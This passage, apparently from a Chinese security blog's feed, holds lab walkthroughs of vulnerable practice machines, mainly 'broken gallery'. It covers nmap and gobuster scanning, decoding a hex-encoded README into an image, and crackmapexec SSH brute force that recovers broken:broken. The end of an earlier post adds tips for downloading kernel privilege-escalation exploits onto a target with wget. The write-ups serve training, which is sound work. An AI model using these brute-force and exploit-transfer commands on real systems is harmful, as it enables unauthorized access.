~]$</span><br></pre></td></tr></table></figure><p>内核版本3.10 版本不高 注意到dirty cow（脏牛）漏洞的范围是2.6.22 —— 4.8.3</p></blockquote><p>权限提升这步一般利用现成的脚本</p><p>常用的命令：</p><blockquote><p>查找脚本并下载</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;searchsploit + 关键词</span><br><span class="line">&gt;searchsploit kernel <span class="number">3</span>.<span class="number">10</span> privilege escalation</span><br><span class="line">&gt;searchsploit -m <span class="number">33516</span>.c</span><br></pre></td></tr></table></figure><p>本地开启80端口,监听网卡0</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;php -S <span class="number">0</span>:<span class="number">80</span></span><br></pre></td></tr></table></figure><p>操控靶机下载攻击机的脚本</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;wget http://攻击机ip/文件名</span><br><span class="line">&gt;wget http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">19</span>/<span class="number">33516</span>.c</span><br></pre></td></tr></table></figure><p>借助linpeas.sh提示工具</p><ul><li>先把linpeas.sh上传至靶机</li><li>然后编译运行，看suggest部分的推荐</li><li>攻击机使用searchsploit获取对应脚本</li></ul><p>常用的脚本依赖库有 -pthread -lcrypt</p></blockquote><p>拿下</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231021225015505.png"></p>]]></content>
      
      
      <categories>
          
          <category> 打靶 </category>
          
          <category> MyFileServer </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 打靶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>broken grallery</title>
      <link href="/2023/11/18/htb%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/brokengallery/"/>
      <url>/2023/11/18/htb%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/brokengallery/</url>
      
        <content type="html"><![CDATA[<h1 id="broken-grallery"><a href="#broken-grallery" class="headerlink" title="broken grallery"></a>broken grallery</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><p>扫描整个c段发现目标主机192.168.31.78</p><h3 id="全端口扫描"><a href="#全端口扫描" class="headerlink" title="全端口扫描"></a>全端口扫描</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -p- --min-rate=<span class="number">10000</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span> -oA nmapscan/ports</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[~]</span><br><span class="line">└─# nmap -sT -p- --min-rate=<span class="number">10000</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span> -oA /home/lkk/nmapscan/ports</span><br><span class="line">Starting Nmap <span class="number">7</span>.<span class="number">93</span> ( https://nmap.org ) <span class="built_in">at</span> <span class="number">2023</span>-<span class="number">10</span>-<span class="number">21</span> <span class="number">23</span>:<span class="number">31</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> ubuntu (<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span>)</span><br><span class="line">Host is up (<span class="number">0</span>.<span class="number">00048</span>s latency).</span><br><span class="line"><span class="keyword">Not</span> shown: <span class="number">65533</span> closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp open  ssh</span><br><span class="line"><span class="number">80</span>/tcp open  http</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:<span class="number">4</span>E:E6:F6 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">4</span>.<span class="number">16</span> seconds</span><br></pre></td></tr></table></figure><p>发现端口 22，80</p></blockquote><h3 id="详细扫描"><a href="#详细扫描" class="headerlink" title="详细扫描"></a>详细扫描</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sV -O -sC -p22,<span class="number">80</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span> -oA nmapscan/detail</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# nmap -sT -sV -O -sC -p22,<span class="number">80</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span> -oA nmapscan/detail</span><br><span class="line">Starting Nmap <span class="number">7</span>.<span class="number">93</span> ( https://nmap.org ) <span class="built_in">at</span> <span class="number">2023</span>-<span class="number">10</span>-<span class="number">21</span> <span class="number">23</span>:<span class="number">33</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> ubuntu (<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span>)</span><br><span class="line">Host is up (<span class="number">0</span>.<span class="number">00031</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp open  ssh     OpenSSH <span class="number">7</span>.<span class="number">2</span>p2 Ubuntu <span class="number">4</span>ubuntu2.<span class="number">8</span> (Ubuntu Linux; protocol <span class="number">2</span>.<span class="number">0</span>)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   <span class="number">2048</span> <span class="number">395</span>ebf8a49a313fa0d34b8db265779a7 (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">20</span>d772be306a2714e1e6c2167a40c852 (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">84</span>a09a59612ab71edd6eda3b91f9a0c6 (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp open  http    Apache httpd <span class="number">2</span>.<span class="number">4</span>.<span class="number">18</span></span><br><span class="line">| http-ls: Volume /</span><br><span class="line">| SIZE  <span class="built_in">TIME</span>              FILENAME</span><br><span class="line">| <span class="number">55</span>K   <span class="number">2019</span>-<span class="number">08</span>-<span class="number">09</span> <span class="number">01</span>:<span class="number">20</span>  README.<span class="built_in">md</span></span><br><span class="line">| <span class="number">1</span>.<span class="number">1</span>K  <span class="number">2019</span>-<span class="number">08</span>-<span class="number">09</span> <span class="number">01</span>:<span class="number">21</span>  gallery.html</span><br><span class="line">| <span class="number">259</span>K  <span class="number">2019</span>-<span class="number">08</span>-<span class="number">09</span> <span class="number">01</span>:<span class="number">11</span>  img_5terre.jpg</span><br><span class="line">| <span class="number">114</span>K  <span class="number">2019</span>-<span class="number">08</span>-<span class="number">09</span> <span class="number">01</span>:<span class="number">11</span>  img_forest.jpg</span><br><span class="line">| <span class="number">663</span>K  <span class="number">2019</span>-<span class="number">08</span>-<span class="number">09</span> <span class="number">01</span>:<span class="number">11</span>  img_lights.jpg</span><br><span class="line">| <span class="number">8</span>.<span class="number">4</span>K  <span class="number">2019</span>-<span class="number">08</span>-<span class="number">09</span> <span class="number">01</span>:<span class="number">11</span>  img_mountains.jpg</span><br><span class="line">|_</span><br><span class="line">|_http-<span class="built_in">title</span>: Index of /</span><br><span class="line">|_http-server-header: Apache/<span class="number">2</span>.<span class="number">4</span>.<span class="number">18</span> (Ubuntu)</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:<span class="number">4</span>E:E6:F6 (VMware)</span><br><span class="line"><span class="function">Warning: <span class="title">OSScan</span> <span class="title">results</span> <span class="title">may</span> <span class="title">be</span> <span class="title">unreliable</span> <span class="title">because</span> <span class="title">we</span> <span class="title">could</span> <span class="title">not</span> <span class="title">find</span> <span class="title">at</span> <span class="title">least</span> 1 <span class="title">open</span> <span class="title">and</span> 1 <span class="title">closed</span> <span class="title">port</span></span></span><br><span class="line"><span class="function"><span class="title">Device</span> <span class="title">type</span>: <span class="title">general</span> <span class="title">purpose</span></span></span><br><span class="line"><span class="function"><span class="title">Running</span>: <span class="title">Linux</span> 3.<span class="title">X</span>|4.<span class="title">X</span></span></span><br><span class="line"><span class="function"><span class="title">OS</span> <span class="title">CPE</span>: <span class="title">cpe</span>:/<span class="title">o:linux</span>:<span class="title">linux_kernel</span>:3 <span class="title">cpe</span>:/<span class="title">o:linux</span>:<span class="title">linux_kernel</span>:4</span></span><br><span class="line"><span class="function"><span class="title">OS</span> <span class="title">details</span>: <span class="title">Linux</span> 3.2 - 4.9</span></span><br><span class="line"><span class="function"><span class="title">Network</span> <span class="title">Distance</span>: 1 <span class="title">hop</span></span></span><br><span class="line"><span class="function"><span class="title">Service</span> <span class="title">Info</span>: <span class="title">Host</span>: 127.0.1.1; <span class="title">OS</span>: <span class="title">Linux</span>; <span class="title">CPE</span>: <span class="title">cpe</span>:/<span class="title">o:linux</span>:<span class="title">linux_kernel</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">OS</span> <span class="title">and</span> <span class="title">Service</span> <span class="title">detection</span> <span class="title">performed</span>. <span class="title">Please</span> <span class="title">report</span> <span class="title">any</span> <span class="title">incorrect</span> <span class="title">results</span> <span class="title">at</span> <span class="title">https</span>://<span class="title">nmap.org</span>/<span class="title">submit</span>/ .</span></span><br><span class="line"><span class="function"><span class="title">Nmap</span> <span class="title">done</span>: 1 <span class="title">IP</span> <span class="title">address</span> (1 <span class="title">host</span> <span class="title">up</span>) <span class="title">scanned</span> <span class="title">in</span> 9.19 <span class="title">seconds</span></span></span><br></pre></td></tr></table></figure><p>根据扫描信息，重点放在web了</p></blockquote><h3 id="udp扫描"><a href="#udp扫描" class="headerlink" title="udp扫描"></a>udp扫描</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU -top-ports <span class="number">20</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span> -oA nmapscan/udp</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# nmap -sU -top-ports <span class="number">20</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span> -oa nmapscan/udp                               </span><br><span class="line">Starting Nmap <span class="number">7</span>.<span class="number">93</span> ( https://nmap.org ) <span class="built_in">at</span> <span class="number">2023</span>-<span class="number">10</span>-<span class="number">21</span> <span class="number">23</span>:<span class="number">34</span> CST</span><br><span class="line">Unable to split netmask from target expression: &quot;nmapscan/udp&quot;</span><br><span class="line">Nmap scan report <span class="keyword">for</span> ubuntu (<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span>)</span><br><span class="line">Host is up (<span class="number">0</span>.<span class="number">00039</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE         SERVICE</span><br><span class="line"><span class="number">53</span>/udp    closed        domain</span><br><span class="line"><span class="number">67</span>/udp    closed        dhcps</span><br><span class="line"><span class="number">68</span>/udp    open|filtered dhcpc</span><br><span class="line"><span class="number">69</span>/udp    closed        tftp</span><br><span class="line"><span class="number">123</span>/udp   closed        ntp</span><br><span class="line"><span class="number">135</span>/udp   closed        msrpc</span><br><span class="line"><span class="number">137</span>/udp   closed        netbios-ns</span><br><span class="line"><span class="number">138</span>/udp   closed        netbios-dgm</span><br><span class="line"><span class="number">139</span>/udp   closed        netbios-ssn</span><br><span class="line"><span class="number">161</span>/udp   closed        snmp</span><br><span class="line"><span class="number">162</span>/udp   closed        snmptrap</span><br><span class="line"><span class="number">445</span>/udp   closed        microsoft-ds</span><br><span class="line"><span class="number">500</span>/udp   closed        isakmp</span><br><span class="line"><span class="number">514</span>/udp   closed        syslog</span><br><span class="line"><span class="number">520</span>/udp   closed        route</span><br><span class="line"><span class="number">631</span>/udp   open|filtered ipp</span><br><span class="line"><span class="number">1434</span>/udp  closed        ms-sql-m</span><br><span class="line"><span class="number">1900</span>/udp  closed        upnp</span><br><span class="line"><span class="number">4500</span>/udp  closed        nat-t-ike</span><br><span class="line"><span class="number">49152</span>/udp closed        unknown</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:<span class="number">4</span>E:E6:F6 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">20</span>.<span class="number">55</span> seconds</span><br></pre></td></tr></table></figure></blockquote><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>tcp只开了22和80</p><p>80优先级最高，先访问网站看看有什么</p><h2 id="找突破口"><a href="#找突破口" class="headerlink" title="找突破口"></a>找突破口</h2><p>访问目标网站</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231022163551675.png" alt="image-20231022163551675"></p><p>查看里边所有的图片，并注意超链接的目标，url的变化</p><p>并没有什么特殊收获</p><p>把上面的文件都下载下来</p><p>使用命令确定文件格式</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file README.<span class="built_in">md</span></span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk/http]</span><br><span class="line">└─# file README.<span class="built_in">md</span>                         </span><br><span class="line"><span class="function">README.md: <span class="title">CSV</span> <span class="title">text</span></span></span><br></pre></td></tr></table></figure></blockquote><p>cat 查看README.md</p><p>发现README.md里边的文件是十六进制的内容</p><p>像这样的内容</p><blockquote><p>0x66, 0x36, 0xC5, 0x63, 0xA9, 0x22, 0x62, 0xA5, 0x80, 0x0A, 0xC4, 0x19, 0x38, 0x10, 0x81, 0xF7,<br>0xE0, 0xB5, 0x51, 0xE5, 0x3E, 0xD6, 0xCC, 0xDA, 0x23, 0x2F, 0x87, 0xDA, 0x8C, 0xA6, 0x15, 0xFA,<br>0xC4, 0xE0, 0xB3, 0xC3, 0x65, 0x61, 0x62, 0xEC, 0xF5, 0x8D, 0x96, 0xD6, 0xB0, 0x98, 0x04, 0x08,<br>0x81, 0xAF, 0x38, 0xD6, 0x23, 0x42, 0x8F, 0xB1, 0xE7, 0x74, 0xF2, 0xC5, 0xD4, 0xDD, 0x35, 0xB4,<br>0xC2, 0x59, 0x58, 0x47, 0xD3, 0x98, 0x1A, 0x40, 0x94, 0x6A, 0x0C, 0x06, 0xBE, 0xC3, 0xCA, 0xF7,<br>0xAE, 0xF6, 0x04, 0x46, 0x63, 0xE3, 0x6B, 0x9C, 0xFB, 0x3A, 0x41, 0x35, 0x81, 0x80, 0x93, 0xF1,<br>0xEF, 0x8F, 0xB2, 0x9E, 0x5C, 0xEC, 0x29, 0x5A, 0x68, 0x85, 0x86, 0xAE, 0x74, 0xA6, 0x75, 0x83,<br>0xDD, 0x4A, 0x15, 0x7B, 0x31, 0xC1, 0x0C, 0x3E, 0x01, 0x84, 0x40, 0x9F, 0x52, 0xD1, 0x6A, 0xB4,<br>0xC8, 0xCE, 0x04, 0xA4, 0x3E, 0x79, 0xE6, 0xF5, 0xBC, 0x29, 0xFE, 0x42, 0x19, 0x0F, 0x5F, 0xF9,<br>0x39, 0x31, 0x3F, 0x2C, 0xFB, 0x9C, 0x91, 0xC7, 0xE8, 0xB8, 0x2C, 0x57, 0x93, 0xD3, 0xF4, 0xA4,<br>0x52, 0xA8, 0xCF, 0x8F, 0x19, 0x6C, 0x1C, 0x8B, 0x79, 0x36, 0x44, 0x2A, 0x56, 0x9E, 0xC0, 0xE4,<br>0xDC, 0x4A, 0xF1, 0x80, 0xB3, 0x3B, 0x4C, 0xC8, 0x6E, 0x45, 0x01, 0x9F, 0x8F, 0x2D, 0x1D, 0x78,<br>0x74, 0x8F, 0x4E, 0xFF, 0x00, 0x53, 0x59, 0x18, 0x4A, 0x96, 0x10, 0xA8, 0x39, 0x9C, 0xE0, 0x73,<br>0x39, 0x9E, 0x6E, 0x18, 0x9B, 0x4E, 0x41, 0xD7, 0x20, 0x9F, 0x87, 0xF9, 0x50, 0x27, 0xFE, 0xB7,<br>0x7F, 0xFF, 0xC4, 0x00, 0x14, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br>0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xDA, 0x00, 0x08, 0x01, 0x02, 0x01, 0x01, 0x3F,<br>0x00, 0x5D, 0x7F, 0xFF, 0xC4, 0x00, 0x14, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br>0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xDA, 0x00, 0x08, 0x01, 0x03, 0x01,<br>0x01, 0x3F, 0x00, 0x5D, 0x7F, 0xFF, 0xD9,</p></blockquote><p>先不急，使用exiftool工具查看网站上的图片，看看有没有什么特殊的信息</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool *.jpg</span><br></pre></td></tr></table></figure><blockquote><p>“exiftool”（也称为 ExifTool）是一种用于读取、编写和编辑图像和其他多媒体文件的工具。其主要作用包括：</p><ol><li><strong>读取和显示图像元数据</strong>：ExifTool可以读取图像文件（如JPEG、TIFF、PNG等）中的元数据信息，包括拍摄日期、相机制造商、曝光时间、焦距、ISO感光度等信息。这些信息通常嵌入在文件中，可以用于了解文件的详细信息。</li><li><strong>编辑和更新元数据</strong>：ExifTool允许用户编辑和更新图像和多媒体文件的元数据。这意味着你可以修改拍摄日期、添加描述、更改作者等信息，以满足特定需求。</li></ol></blockquote><p>没有什么其他的信息，应该不存在隐写或者其他的什么东西。</p><h4 id="做个目录爆破吧"><a href="#做个目录爆破吧" class="headerlink" title="做个目录爆破吧"></a>做个目录爆破吧</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span> -w /usr/share/dirbuster/wordlists/directory-list-<span class="number">2</span>.<span class="number">3</span>-medium.txt</span><br></pre></td></tr></table></figure><h4 id="对readme文件的处理"><a href="#对readme文件的处理" class="headerlink" title="对readme文件的处理"></a>对readme文件的处理</h4><p>使用xxd工具把文件还原回二进制</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -r -ps README.<span class="built_in">md</span> &gt; readme.bin</span><br></pre></td></tr></table></figure><p>再查看它的文件头，判断是一个什么类型的文件（string查看二进制文件中可打印的字符串）</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings readme.bin | head -n <span class="number">20</span></span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk/http]</span><br><span class="line">└─# strings readme.bin | head -n <span class="number">20</span></span><br><span class="line">JFIF</span><br><span class="line">Compressed by jpeg-recompress</span><br><span class="line"></span><br><span class="line">&quot;*<span class="variable">%%*</span><span class="number">424</span>DD\</span><br><span class="line"></span><br><span class="line">&quot;*<span class="variable">%%*</span><span class="number">424</span>DD\</span><br><span class="line">&#x27;X&quot;U</span><br><span class="line">&#125;Y&#125;IS&gt;</span><br><span class="line">p &quot;#<span class="variable">%0@P</span></span><br><span class="line"><span class="variable">4jgAL</span></span><br><span class="line"><span class="variable">~^+#5V</span></span><br><span class="line"><span class="variable">k&amp;qo!</span></span><br><span class="line"><span class="variable">uMWn</span></span><br><span class="line"><span class="variable">d1Z%</span></span><br><span class="line"><span class="variable">%7D#</span></span><br><span class="line"><span class="variable">R1mB_d</span></span><br><span class="line"><span class="variable">PvPj</span></span><br><span class="line"><span class="variable">z1&#125;fZ%</span>(*%</span><br><span class="line">]kDA&gt;E</span><br><span class="line">J*;iV</span><br></pre></td></tr></table></figure><p>注意第四行，应该是一个jpeg类型的文件</p></blockquote><p>修改README.md格式 </p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp README.bin readme.jpeg</span><br></pre></td></tr></table></figure><p>再用资源管理器打开</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xdg-open readme.jpeg</span><br></pre></td></tr></table></figure><blockquote><p><code>xdg-open</code> 是一个方便的工具，可帮助用户以一种简单的方式打开各种不同类型的文件和资源，而无需手动选择应用程序。</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231022211841813.png" alt="image-20231022211841813"></p><p>故意把broken大写，而且下面害留了邮箱。</p><p>很难不让人怀疑跟用户名和密码有关</p></blockquote><h2 id="尝试根据已有提示编写目录字典爆破ssh"><a href="#尝试根据已有提示编写目录字典爆破ssh" class="headerlink" title="尝试根据已有提示编写目录字典爆破ssh"></a>尝试根据已有提示编写目录字典爆破ssh</h2><p>往密码字典里写入这些内容</p><blockquote><p>  1 Bob<br>  2 broken<br>  3 <a href="mailto:&#97;&#118;&#x72;&#x61;&#104;&#x61;&#109;&#99;&#111;&#104;&#101;&#110;&#x2e;&#x61;&#99;&#64;&#x67;&#109;&#x61;&#x69;&#108;&#46;&#99;&#x6f;&#109;">&#97;&#118;&#x72;&#x61;&#104;&#x61;&#109;&#99;&#111;&#104;&#101;&#110;&#x2e;&#x61;&#99;&#64;&#x67;&#109;&#x61;&#x69;&#108;&#46;&#99;&#x6f;&#109;</a><br>  4 gallery<br>  5 5terre<br>  6 forest<br>  7 lights<br>  8 mountains</p></blockquote><p>使用crackmapexec暴力破解ssh</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec ssh <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span> -u pw.txt -p pw.txt --continue-on-success</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# crackmapexec ssh <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span> -u pw.txt -p pw.txt --continue-on-success                </span><br><span class="line">SSH         <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span>   <span class="number">22</span>     <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span>    [*] SSH-<span class="number">2</span>.<span class="number">0</span>-OpenSSH_7.<span class="number">2</span>p2 Ubuntu-<span class="number">4</span>ubuntu2.<span class="number">8</span></span><br><span class="line">SSH         <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span>   <span class="number">22</span>     <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span>    [-] Bob:Bob Authentication failed.</span><br><span class="line">SSH         <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span>   <span class="number">22</span>     <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span>    [-] Bob:broken Authentication failed.</span><br><span class="line">SSH         <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span>   <span class="number">22</span>     <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span>    [-] Bob:avrahamcohen.ac@gmail.com Authentication failed.</span><br><span class="line">SSH         <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span>   <span class="number">22</span>     <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span>    [-] Bob:gallery Authentication failed.</span><br><span class="line">SSH         <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span>   <span class="number">22</span>     <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span>    [-] Bob:<span class="number">5</span>terre Authentication failed.</span><br><span class="line">SSH         <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span>   <span class="number">22</span>     <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span>    [-] Bob:forest Authentication failed.</span><br><span class="line">SSH         <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span>   <span class="number">22</span>     <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span>    [-] Bob:lights Authentication failed.</span><br><span class="line">SSH         <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span>   <span class="number">22</span>     <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span>    [-] Bob:mountains Authentication failed.</span><br><span class="line">SSH         <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span>   <span class="number">22</span>     <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span>    [-] broken:Bob Authentication failed.</span><br><span class="line">SSH         <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span>   <span class="number">22</span>     <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span>    [+] broken:broken </span><br><span class="line">SSH         <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span>   <span class="number">22</span>     <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span>    [-] broken:avrahamcohen.ac@gmail.com Authentication failed.</span><br><span class="line">SSH         <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span>   <span class="number">22</span>     <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span>    [-] broken:gallery Authentication failed.</span><br></pre></td></tr></table></figure><p>14行成功了</p></blockquote><p>用户名和密码都是broken</p><h2 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span 